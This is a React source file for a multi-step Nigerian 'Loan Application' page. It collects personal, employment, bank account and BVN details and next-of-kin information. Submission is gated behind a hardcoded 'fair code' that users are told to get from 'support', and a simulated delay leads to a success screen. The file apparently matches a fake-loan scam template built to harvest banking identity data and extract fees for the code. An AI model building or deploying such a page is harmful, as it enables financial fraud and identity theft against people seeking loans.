
import React, { useState } from 'react';
import { ArrowLeft, CheckCircle2, ChevronRight } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Progress } from '@/components/ui/progress';
import LoanSuccessPage from '@/components/loan/LoanSuccessPage';
import { nigerianBanks } from '@/utils/banks';

interface LoanPageProps {
  onBack: () => void;
}

const LoanPage: React.FC<LoanPageProps> = ({ onBack }) => {
  const [currentStep, setCurrentStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);

  // Form data
  const [formData, setFormData] = useState({
    // Step 1: Personal Info
    fullName: '',
    phoneNumber: '',
    email: '',
    dateOfBirth: '',
    gender: '',
    maritalStatus: '',
    
    // Step 2: Employment Info
    employmentStatus: '',
    monthlyIncome: '',
    employerName: '',
    workAddress: '',
    yearsEmployed: '',
    
    // Step 3: Loan Details
    loanAmount: '',
    loanPurpose: '',
    loanTerm: '',
    
    // Step 4: Bank Details
    accountNumber: '',
    accountName: '',
    bankName: '',
    bvn: '',
    
    // Step 5: Next of Kin
    kinName: '',
    kinPhone: '',
    kinRelationship: '',
    kinAddress: '',
    
    fairCode: ''
  });

  const totalSteps = 5;
  const progress = (currentStep / totalSteps) * 100;

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const validateStep = () => {
    switch (currentStep) {
      case 1:
        return formData.fullName && formData.phoneNumber && formData.email && 
               formData.dateOfBirth && formData.gender && formData.maritalStatus;
      case 2:
        return formData.employmentStatus && formData.monthlyIncome && 
               formData.employerName && formData.workAddress;
      case 3:
        return formData.loanAmount && formData.loanPurpose && formData.loanTerm;
      case 4:
        return formData.accountNumber && formData.accountName && 
               formData.bankName && formData.bvn;
      case 5:
        return formData.kinName && formData.kinPhone && 
               formData.kinRelationship && formData.fairCode;
      default:
        return false;
    }
  };

  const handleNext = () => {
    if (validateStep()) {
      if (currentStep < totalSteps) {
        setCurrentStep(prev => prev + 1);
        setShowError(false);
      }
    } else {
      setShowError(true);
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(prev => prev - 1);
      setShowError(false);
    }
  };

  const handleSubmit = async () => {
    if (formData.fairCode !== 'F-187377') {
      setShowError(true);
      return;
    }

    setIsLoading(true);

    // Save to admin dashboard
    const savedApplications = JSON.parse(localStorage.getItem('loanApplications') || '[]');
    const newApplication = {
      id: Date.now(),
      ...formData,
      status: 'pending',
      submittedAt: new Date().toISOString()
    };
    savedApplications.push(newApplication);
    localStorage.setItem('loanApplications', JSON.stringify(savedApplications));

    await new Promise(resolve => setTimeout(resolve, 3000));

    setIsLoading(false);
    setShowSuccess(true);
  };

  const handleSuccessOk = () => {
    setShowSuccess(false);
    setFormData({
      fullName: '', phoneNumber: '', email: '', dateOfBirth: '', gender: '', maritalStatus: '',
      employmentStatus: '', monthlyIncome: '', employerName: '', workAddress: '', yearsEmployed: '',
      loanAmount: '', loanPurpose: '', loanTerm: '',
      accountNumber: '', accountName: '', bankName: '', bvn: '',
      kinName: '', kinPhone: '', kinRelationship: '', kinAddress: '', fairCode: ''
    });
    setCurrentStep(1);
  };

  if (showSuccess) {
    return <LoanSuccessPage loanAmount={formData.loanAmount} onOk={handleSuccessOk} />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 to-white">
      {/* Header */}
      <div className="bg-gradient-to-r from-green-600 to-green-700 px-4 py-4 shadow-lg">
        <div className="flex items-center space-x-3">
          <button onClick={onBack} className="p-2 hover:bg-green-800 rounded-full transition-colors">
            <ArrowLeft className="w-6 h-6 text-white" />
          </button>
          <div>
            <h1 className="text-xl font-semibold text-white">Loan Application</h1>
            <p className="text-xs text-green-100">Step {currentStep} of {totalSteps}</p>
          </div>
        </div>
      </div>

      {/* Progress Bar */}
      <div className="px-4 py-4 bg-white shadow-sm">
        <Progress value={progress} className="h-2" />
        <div className="flex justify-between mt-2">
          {['Personal', 'Employment', 'Loan', 'Bank', 'Next of Kin'].map((label, idx) => (
            <div key={idx} className={`text-xs ${currentStep > idx + 1 ? 'text-green-600' : currentStep === idx + 1 ? 'text-green-700 font-semibold' : 'text-gray-400'}`}>
              {label}
            </div>
          ))}
        </div>
      </div>

      <div className="px-4 py-6 max-w-2xl mx-auto">
        <Card className="border-0 shadow-lg">
          <CardContent className="p-6">
            {/* Step 1: Personal Information */}
            {currentStep === 1 && (
              <div className="space-y-4">
                <h2 className="text-lg font-bold text-gray-900 mb-4">Personal Information</h2>
                <Input placeholder="Full Name" value={formData.fullName} onChange={e => handleInputChange('fullName', e.target.value)} />
                <Input placeholder="Phone Number" type="tel" value={formData.phoneNumber} onChange={e => handleInputChange('phoneNumber', e.target.value)} />
                <Input placeholder="Email Address" type="email" value={formData.email} onChange={e => handleInputChange('email', e.target.value)} />
                <Input placeholder="Date of Birth" type="date" value={formData.dateOfBirth} onChange={e => handleInputChange('dateOfBirth', e.target.value)} />
                <Select value={formData.gender} onValueChange={v => handleInputChange('gender', v)}>
                  <SelectTrigger><SelectValue placeholder="Gender" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="male">Male</SelectItem>
                    <SelectItem value="female">Female</SelectItem>
                    <SelectItem value="other">Other</SelectItem>
                  </SelectContent>
                </Select>
                <Select value={formData.maritalStatus} onValueChange={v => handleInputChange('maritalStatus', v)}>
                  <SelectTrigger><SelectValue placeholder="Marital Status" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="single">Single</SelectItem>
                    <SelectItem value="married">Married</SelectItem>
                    <SelectItem value="divorced">Divorced</SelectItem>
                    <SelectItem value="widowed">Widowed</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            )}

            {/* Step 2: Employment Information */}
            {currentStep === 2 && (
              <div className="space-y-4">
                <h2 className="text-lg font-bold text-gray-900 mb-4">Employment Information</h2>
                <Select value={formData.employmentStatus} onValueChange={v => handleInputChange('employmentStatus', v)}>
                  <SelectTrigger><SelectValue placeholder="Employment Status" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="employed">Employed</SelectItem>
                    <SelectItem value="self-employed">Self-Employed</SelectItem>
                    <SelectItem value="unemployed">Unemployed</SelectItem>
                    <SelectItem value="student">Student</SelectItem>
                  </SelectContent>
                </Select>
                <Input placeholder="Monthly Income (₦)" type="number" value={formData.monthlyIncome} onChange={e => handleInputChange('monthlyIncome', e.target.value)} />
                <Input placeholder="Employer Name" value={formData.employerName} onChange={e => handleInputChange('employerName', e.target.value)} />
                <Input placeholder="Work Address" value={formData.workAddress} onChange={e => handleInputChange('workAddress', e.target.value)} />
                <Select value={formData.yearsEmployed} onValueChange={v => handleInputChange('yearsEmployed', v)}>
                  <SelectTrigger><SelectValue placeholder="Years at Current Job" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="<1">Less than 1 year</SelectItem>
                    <SelectItem value="1-2">1-2 years</SelectItem>
                    <SelectItem value="3-5">3-5 years</SelectItem>
                    <SelectItem value="5+">5+ years</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            )}

            {/* Step 3: Loan Details */}
            {currentStep === 3 && (
              <div className="space-y-4">
                <h2 className="text-lg font-bold text-gray-900 mb-4">Loan Details</h2>
                <Input placeholder="Loan Amount (₦)" type="number" value={formData.loanAmount} onChange={e => handleInputChange('loanAmount', e.target.value)} />
                <Select value={formData.loanPurpose} onValueChange={v => handleInputChange('loanPurpose', v)}>
                  <SelectTrigger><SelectValue placeholder="Purpose of Loan" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="business">Business</SelectItem>
                    <SelectItem value="education">Education</SelectItem>
                    <SelectItem value="medical">Medical</SelectItem>
                    <SelectItem value="personal">Personal</SelectItem>
                    <SelectItem value="home">Home Improvement</SelectItem>
                  </SelectContent>
                </Select>
                <Select value={formData.loanTerm} onValueChange={v => handleInputChange('loanTerm', v)}>
                  <SelectTrigger><SelectValue placeholder="Repayment Period" /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="3">3 months</SelectItem>
                    <SelectItem value="6">6 months</SelectItem>
                    <SelectItem value="12">12 months</SelectItem>
                    <SelectItem value="24">24 months</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            )}

            {/* Step 4: Bank Details */}
            {currentStep === 4 && (
              <div className="space-y-4">
                <h2 className="text-lg font-bold text-gray-900 mb-4">Bank Details</h2>
                <Input placeholder="Account Number" value={formData.accountNumber} onChange={e => handleInputChange('accountNumber', e.target.value)} />
                <Input placeholder="Account Name" value={formData.accountName} onChange={e => handleInputChange('accountName', e.target.value)} />
                <Select value={formData.bankName} onValueChange={v => handleInputChange('bankName', v)}>
                  <SelectTrigger><SelectValue placeholder="Select Bank" /></SelectTrigger>
                  <SelectContent className="max-h-60">
                    {nigerianBanks.map(bank => <SelectItem key={bank} value={bank}>{bank}</SelectItem>)}
                  </SelectContent>
                </Select>
                <Input placeholder="BVN" value={formData.bvn} onChange={e => handleInputChange('bvn', e.target.value)} />
              </div>
            )}

            {/* Step 5: Next of Kin */}
            {currentStep === 5 && (
              <div className="space-y-4">
                <h2 className="text-lg font-bold text-gray-900 mb-4">Next of Kin Information</h2>
                <Input placeholder="Full Name" value={formData.kinName} onChange={e => handleInputChange('kinName', e.target.value)} />
                <Input placeholder="Phone Number" type="tel" value={formData.kinPhone} onChange={e => handleInputChange('kinPhone', e.target.value)} />
                <Input placeholder="Relationship" value={formData.kinRelationship} onChange={e => handleInputChange('kinRelationship', e.target.value)} />
                <Input placeholder="Address" value={formData.kinAddress} onChange={e => handleInputChange('kinAddress', e.target.value)} />
                <Input placeholder="Fair Code" value={formData.fairCode} onChange={e => handleInputChange('fairCode', e.target.value)} />
              </div>
            )}

            {showError && (
              <div className="mt-4 p-4 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-red-700 text-sm">
                  {currentStep === 5 && formData.fairCode !== 'F-187377' 
                    ? 'Wrong faircode! Contact support to get your faircode.'
                    : 'Please fill all required fields.'}
                </p>
              </div>
            )}

            {/* Navigation Buttons */}
            <div className="flex space-x-3 mt-6">
              {currentStep > 1 && (
                <Button onClick={handleBack} variant="outline" className="flex-1">
                  Back
                </Button>
              )}
              {currentStep < totalSteps ? (
                <Button onClick={handleNext} className="flex-1 bg-green-600 hover:bg-green-700">
                  Next <ChevronRight className="w-4 h-4 ml-2" />
                </Button>
              ) : (
                <Button onClick={handleSubmit} disabled={isLoading} className="flex-1 bg-green-600 hover:bg-green-700">
                  {isLoading ? 'Submitting...' : 'Submit Application'}
                </Button>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default LoanPage;
